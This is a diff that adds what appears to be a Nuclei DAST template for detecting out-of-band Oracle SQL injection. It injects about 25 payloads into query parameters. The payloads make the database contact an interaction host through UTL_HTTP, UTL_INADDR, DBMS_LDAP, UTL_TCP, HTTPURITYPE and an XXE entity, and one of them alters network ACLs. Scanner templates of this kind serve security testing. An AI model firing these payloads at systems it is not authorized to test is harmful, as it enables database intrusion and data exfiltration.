@@ -1,0 +1,65 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{oracle_oob}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    oracle_oob:
+    - 1 UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL--
+    - 1' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL)
+      IS NOT NULL--
+    - 1' OR EXISTS(SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL)--
+    - 1' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE
+      root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xml"> %remote;]>'),'/l')
+      FROM DUAL--
+    - 1' UNION SELECT HTTPURITYPE('http://{{interactsh-url}}/http').GETCLOB() FROM
+      DUAL--
+    - 1' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL--
+    - 1'),((SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL))--
+    - 1'; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
+    - 1'; BEGIN DBMS_LDAP.INIT('ldap://{{interactsh-url}}:389'); EXCEPTION WHEN OTHERS
+      THEN NULL; END;--
+    - 1'; BEGIN DBMS_LDAP.INIT('{{interactsh-url}}', 389); EXCEPTION WHEN OTHERS THEN
+      NULL; END;--
+    - 1'; BEGIN DBMS_NETWORK_ACL_ADMIN.CREATE_ACL('test.xml','test','{{interactsh-url}}');
+      END;--
+    - 1'; BEGIN UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle'); EXCEPTION WHEN
+      OTHERS THEN NULL; END;--
+    - 1'; DECLARE c UTL_TCP.CONNECTION; BEGIN c := UTL_TCP.OPEN_CONNECTION('{{interactsh-url}}',
+      80); UTL_TCP.CLOSE_CONNECTION(c); END;--
+    - 1'; DECLARE req UTL_HTTP.REQ; BEGIN req := UTL_HTTP.BEGIN_REQUEST('http://{{interactsh-url}}/oracle');
+      END;--
+    - 1'; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
+    - 1'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL)--
+    - 1; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
+    - 1" AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL)
+      IS NOT NULL--
+    - 1" UNION SELECT HTTPURITYPE('http://{{interactsh-url}}/http').GETCLOB() FROM
+      DUAL--
+    - 1" UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL--
+    - 1"; BEGIN DBMS_LDAP.INIT('{{interactsh-url}}', 389); EXCEPTION WHEN OTHERS THEN
+      NULL; END;--
+    - 1"; BEGIN UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle'); EXCEPTION WHEN
+      OTHERS THEN NULL; END;--
+    - 1"; DECLARE c UTL_TCP.CONNECTION; BEGIN c := UTL_TCP.OPEN_CONNECTION('{{interactsh-url}}',
+      80); UTL_TCP.CLOSE_CONNECTION(c); END;--
+    - 1"; DECLARE req UTL_HTTP.REQ; BEGIN req := UTL_HTTP.BEGIN_REQUEST('http://{{interactsh-url}}/oracle');
+      END;--
+  stop-at-first-match: true
+id: ai-fuzz-oracle-oob
+info:
+  author: openai
+  name: Oracle OOB via UTL_HTTP and DBMS_LDAP
+  severity: high
+  tags: oracle,oob,dast
